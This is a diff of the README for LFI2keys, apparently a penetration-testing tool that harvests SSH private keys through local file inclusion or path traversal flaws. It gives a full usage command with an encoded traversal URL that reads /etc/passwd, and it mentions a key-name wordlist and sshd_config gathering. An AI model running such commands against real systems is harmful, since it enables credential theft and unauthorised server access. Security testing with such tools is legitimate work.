@@ -1,12 +1,12 @@
 ## Summary
-Found a local file inclusion or path traversal vulnerability? Automate the extraction of SSH private keys with LFI2keys. It uses the exposed `/etc/passwd` file to extract valid users, checks for commonly named SSH keys, and gathers useful SSH configuration details from `/etc/ssh/sshd_config`.
+Found a local file inclusion or path traversal vulnerability? Automate the extraction of SSH private keys with LFI2keys. It uses the exposed `/etc/passwd` file to extract valid users, checks for commonly named SSH keys, and gathers useful SSH configuration details.
 
 ## Usage
 Provide the full URL of the vulnerable endpoint where you can read the `/etc/passwd` file, and supply a private key [wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists). Use the `-v` parameter for verbose output and for printing the found private key.
 
 ```bash
 ┌──(kali㉿DC07 | 2025-02-12 00:13:37)-[~]
-└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-extended.txt -a -o keys.txt
+└─$ python3 lfi2keys.py -u https://127.0.0.1/cgi-bin/.%2e/.%2e/etc/passwd -l ssh-priv-key-loot-common.txt -a -o keys.txt
 
   _    ___ ___ ___ _  _______   _____ 
  | |  | __|_ _|_  ) |/ / __\ \ / / __|
